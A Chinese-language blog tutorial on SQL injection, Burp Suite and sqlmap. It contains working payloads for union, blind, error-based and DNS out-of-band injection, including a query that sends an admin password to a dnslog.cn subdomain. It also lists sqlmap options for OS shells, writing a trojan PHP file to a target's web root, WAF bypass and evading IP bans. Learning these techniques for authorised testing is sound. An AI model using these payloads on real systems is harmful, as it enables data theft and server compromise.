---
title: sql注入和sqlmap
date: 2022-04-10 16:26:17
categories:
- CS
- security
tags:
- security
- sql注入
- splmap
toc: true
---
**摘要：本文介绍了sql注入的原理和常用的开源自动化sql注入工具--sqlmap**
<!-- more -->
# 前言
sql注入是最常用的注入手段，被称为漏洞之王，是学习web安全不可或缺的。

---
# 一.sql注入原理
## 1.什么是sql注入
什么是注入？一句话定义：把用户输入的数据当做代码执行

sql注入；用户在网页输入的内容被浏览器当做数据库语句进行执行。

原因是服务端在接收来自客户端的查询参数后，未对查询参数进行严格的过滤。导致恶意用户可在查询参数中插入恶意的sql语句来查询数据库中的敏感信息，最终造成数据库信息泄露。这也是安全防护的方法

关键点：我们输入的内容一定要是数据库语句。

我们输入的地方有哪些:
```
1.网站给我们提供的框框（比如搜索框）
2.网址的参数的值的地方。
```
## 2.mysql常用语法
mysql和sql server都是最常用的数据库语言，虽然语法不同但特别相似。其中mysql是开源的，sql server是微软开发的。
```
库：information_schema 是Mysql数据库里面一个自带的库的库名，存储着你所有的数据库名、表名和列名。
表：schemata,tables，columns;schemata存库名，tables存放都是表名，columns都是列名
列：table_name(存储的表名)， table_schema（存储的是库名），column_name（存储的是列名）
limit m,n # 查询m+1行的n条数据。 m+1行开始查询多少条？如limit 0,1
group_concat #多行数据用一行显示
```
大概的demo长这样：

![![20220411211238](httpscdn.jsdelivr.netghzhangsx19PicBedimages_for_blogs20220411211238.png)](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs![20220411211238](httpscdn.jsdelivr.netghzhangsx19PicBedimages_for_blogs20220411211238.png).png)

## 3.其他类型判断注入漏洞
![20220411215221](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220411215221.png)

我们发现在这里url显示id=1但实际上id='1',多了引号，如果还像上面那样用and 1=2判断就会变成id='1 and 1=2'，即输入的内容会被包括在引号里。我们想到在1后面加个引号，再加上and 1=2，此时会变成

![20220411234743](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220411234743.png)

此时只需注释掉最后一个引号即可。
mysql的两种注释：
```
-- abc   #abc不会被识别，注意--后有空格，但打空格会被自动取消掉，可以打空格的unicode编码%20或+
#abc    #注意不能打#,要打#的unicode编码%23
```
## 4.get注入与post注入
数据包的第一行的第一个是请求方式`GET`或`POST`

![20220413235401](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413235401.png)

以上在URL中传递参数为`GET注入`在网址需要转换成unicode；如果是在网页的框内，为`POST注入`,应该不转换。万能密码：
猜测源代码中有’要形成闭合，#意味注释掉后续代码，因为1=1为真，所以代码执行后为真，通过

![20220412000850](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220412000850.png)

```
数字型判断：and 1=1 / and 1=2
字符型判断：' and 1=1 -- '
搜索型判断：and %' -- q		 id='%abc%'
```
怎么知道是什么类型的？暴力枚举--有类似万能密码字典的东西。

# 二、注入分类
## 1.显错注入-联合查询（Mysql数据库）的基本流程
```
    1.判断网站是否存在数据库注入漏洞
		and 1=1  网页有内容
		and 1=2  网页没有内容  ==> 这个网站存在数据库注入漏洞。
	
	原因：我们输入的数据库语句被网站代入到他的数据库中执行了。
    
	2.判断字段（列）数， order by  ，作用是排序。 
		order by 1 --> 页面有内容，说明网站的那个表有1列
		order by 2 --> 页面有内容，说明网站的那个表有2列
		order by 3 --> 页面没有内容，说明网站的那个表没有3列，--> 只有2列。

	3.查看回显点： union ，作用是联合查询，能够同时执行两条数据库查询语句。
    注意：必须保证两条数据库查询语句查询的表的列数一致。这也是步骤2的必要性。

	回显点的作用：在该处输入的任何数据库语句，都会被直接执行，并且显示到页面上！如修改select 1,2中的2，页面内容发生变化，则第二列为回显点。

	4.查询相关内容
    and 1=2 union select 1,2
    and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 
    and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 
    and 1=2 union select 1,password from admin  limit 0,1  # hellohack
		
```
用到的函数：
```
version() ，# 作用 ：查询版本 ， 如5.5.53
database() # 作用：查询当前数据库的库名 
```

## 2.盲注
## (1)布尔注入
盲注和显错注入的区别就是没有回显点。即我们要通过判断的方式，去查询相关数据内容
用到的函数：
```
length(database()) # 查询的是【当前数据库库名】的长度。
length(database())=2  --> 无查询数据 --> 当前数据库的库名不是2个字符

substr(字符串,m,n)  # 函数，作用是截取。
substr('cmd',1,1) #  --> 截取的是 c 
substr(database(),1,1)  # 截取【当前数据库库名】的第一个字符。
and substr(database(),1,1)='a' --> 页面无内容--> 说明当前数据库库名第一个字符不是a
```
```
and substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) = 'a' --> 第一个字符不是a
```
## (2)时间注入
以上均为布尔盲注，还有一种时间盲注，需用到sleep(),这个函数能让网页延迟显示
```
and sleep(5) # 网站延时了5秒再显示。
if(length(database())=12,sleep(5),1) --> 网站延迟显示5秒，说明判断条件是对的-->当前数据库库明的长度是12
```
可见，盲注很费时间。由此诞生了专门针对数据库注入漏洞的sqlmap工具。
## 3.cookie注入
在Cookie处进行注入。

注意：传递的参数需要进行一次URL编码

## 4.head注入

## 5.报错注入
```
'a and nd updatexml(1,concat(0x21,@@version,0x21),1) -- q
```

## 6.DNS_LOG注入
组合工具。利用DNS解析然后配合日志记录，将数据库里面的数据拿出来。

特点：能够将盲注变成显错注入。oob： out of bind  数据外带。
## （1）什么是DNS
把域名转换成IP地址的协议。域名->IP的外号
```
域名		ip地址
qq.com		12.34.56.78
taobao.com	34.55.88.99
```
```
a、网站搭建在服务器上
b、服务器就是电脑
c、访问网站的本质：浏览互联网上某台电脑上的某个文件
```
例如，修改host文件(本地DNS服务器)，我们输入完http://www.chenchan.com这个域名之后，咱们电脑会先访问host文件，就会将www.chenchan.com解析成192.168.189.128，然后访问这个IP。

## （2）子域名和DNS日志记录
[DNS解析记录的日志网站](http://www.dnslog.cn/),作用：可以申请一个域名，然后会记录下任何访问了这个域名和子域名的IP
```
fefaad.dnslog.cn 都有记录。
database.fefaad.dnslog.cn   也有记录
```
![20220413162258](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413162258.png)
## (3)注入方法
关键函数：
```
load_file() # 作用是：读文件
concat() #  作用是 拼接字符串
select load_file() #读取文件内容
```
命令：
```
select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))
select load_file(concat('//',(select password from admin limit 0,1),'.qtm0xb.dnslog.cn/1.txt'))
```
如图，发现没有回显点后，先输入and (),要执行括号里的语句:`select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))`注意一定要带一个文件，文件是什么无所谓，但loadfile是读取文件的，必须在mysql命令里写一个文件名上去。

![20220413164801](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413164801.png)
![20220413164826](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413164826.png)

# 三、BurpSuite
## 什么是BurpSuite
原理：中间人原理(如0元支付漏洞)

特点：
```
所有模块可共享一个数据请求
能测试网站所有的漏洞
```
## 安装和配置
kali自带的是免费的社区版，功能有限，我们自己安装专业版

![20220413193436](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413193436.png)

选择manual activation，然后无脑下一步

![1](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs1.png)

字体设置：user option -display 

浏览器代理设置：burp依赖于浏览器代理。安装SwitchyOmega插件即可，该插件作用是智能化设置浏览器代理。

![20220413143822](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413143822.png)

记得把插件设置成proxy模式

![20220413203717](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413203717.png)

安装证书：burp默认只能访问http，要访问https的话需要安装CA证书。在burp的proxy模块--options--import/export CA--选择export的certificate in DER format--导出证书的位置(如桌面，保存为1.cer)

然后把证书导入到浏览器里，设置里搜索证书，导入1.cer即可

## 常用模块
### Target:容易探测越权类漏洞
黑体代表访问过的站点，灰体代表没访问过但黑体站点包含的站点。
scope可以设置查看网站的范围。
```
通常配合spider(爬虫)、scanner(扫描web漏洞)模块使用。
spider:将目标网站所有的网页让工具走一遍，然后配合filter找出有参数的页面
scanner:AWVS,appscan,X-ray做的比burp好
```
### proxy:burp的核心作用--抓数据包改包
数据包分为请求数据包和响应数据包
```
输入url,回车 --请求
回车后，出现网页内容 --响应  浏览器拿到响应后渲染出页面
```
HTTP history可查看请求和响应
option可改监听的端口(默认是8080，如果改成8081则浏览器也要改成8081)，还可以`移除需要的验证`(如javascript);`显示隐藏内容`;`自动匹配与替换请求包的内容`

## repeater：手动探测漏洞
比如proxy模块抓包后转发到repeater模块(体现了所有模块可共享数据请求)，可以直接查看响应内容。

## intruder：爆破
爆破是一种常见思想。
```
position --设置爆破位置,默认会帮我们设，可以clear掉
payloads --设置爆破字典
option --可改爆破速度(number of threads,如50)
```
根据响应长度来判断(和大多数不一样)

宏：自动化设置数据

有验证码不能重复？配合其他工具使用

## extender：安装插件
CO2:与sqlmap结合，需配置sqlmap位置如下

![20220413215226](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220413215226.png)

jython.jar:让burp能使用python写的插件
burpJSlinkFinder:能快速发现权限方面的漏洞，需python
burpFaKeip:可以伪造ip和随机ip爆破

# 四、sqlmap
Sqlmap 是一个开源的渗透测试工具，可以自动检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。

[官网](https://sqlmap.org/)。注意：kali自带sqlmap工具。
特点：
```
全面支持各种常用的数据库语言
全面支持六种SQL注入技术：布尔、时间、错误、联合、堆叠、oob
sqlmap偏向于跑盲注
```

用法：
```
python sqlmap.py -u "输入网址"  #要cd sqlmap.py目录，windows用法
sqlmap -u "url"  #kali用法
-h #帮助
sqlmap -u "?id=1&wd=123" -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-u
sqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包
sqlmap -r 1.txt --data="wd=123,id=1" #确定参数，可以跟-u和-r
```
执行时会出现的提示：

```
`POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? #POST参数'n'是脆弱的。 你想继续测试其他人(如果有的话)吗？Y
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')?#是否基于时间注入，选Y
do you want to (re)try to find proper UNION column types with fuzzy test?#要通过模糊测试找到合适的union列类型吗，Y
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? 注入不可利用 NULL 值。是否尝试使用随机整数值作为选项 Y



```

当发现网站确实存在漏洞，就可以找数据了
```
--dbs  #查询所有数据库的库名
-D 指定数据库
--tables #查看所有的表
-T 指定表名
--columns   #查询所有的列名
-C 指定列名 如-D maoshe -T admin -C password --dump
--dump ：查看数据
```


进阶命令：
```
--os-shell#执行系统命令,会让你选择目标网站服务器语言  sqlmap.py -u "" --os-shell 
--batch #默认选择  sqlmap.py -u "" --os-shell --batch
--file-write="yjh_muma.php" --file-dest="C:/phpStudy/WWW/502g58de/xiaoma.php" #写文件到目标位置(木马)
--proxy #使用代理去扫描目标 sqlmap.py -u "" --proxy="http://127.0.0.1:8080/"（代理软件占用的端口在8087)
--random-agent #使用随机的User-Agent头 绕过网站检测(默认user-agent会有sqlmap字段)
--cookie #使用用户身份 sqlmap -u "" --cookie="cookie内容"
--level #提高扫描强度(默认不大)，扫描出漏洞可能性变大，但扫描时间会变长
--risk #风险等级的设定 --level 3 --risk 2(经验值)
--tamper：使用绕WAF的脚本 --tamper="tamper/between.py,tamper/randomcase.py" 
```
![20220414215322](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220414215322.png)
![2](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs2.png)
---
# 总结
学习了sql注入的原理和sqlmap的使用方法。

# 问题
## 1.sqlmap 连接超时
```
看注入的目标地址是不是 https 协议，如果是可以使用sqlmap直接加上–force-ssl参数，告诉sqlmap这是https服务。或者可以在Host头后面加上:443（默认不是443）。

ip 被封，需要开启代理，时刻切换ip，避免封ip

梯子：智能模式访问国内网站仍用正常ip，全局梯子则是所有网站都会改变ip
```
---
# 参考资料
1.[sqlmap中文文档](https://sqlmap.campfire.ga/)

2.[靶场跑不了爆破临时解决办法](https://bbs.zkaq.cn/t/6526.html)

3.[代理和VPN有什么区别](https://www.dailiproxy.com/proxy-vpn/)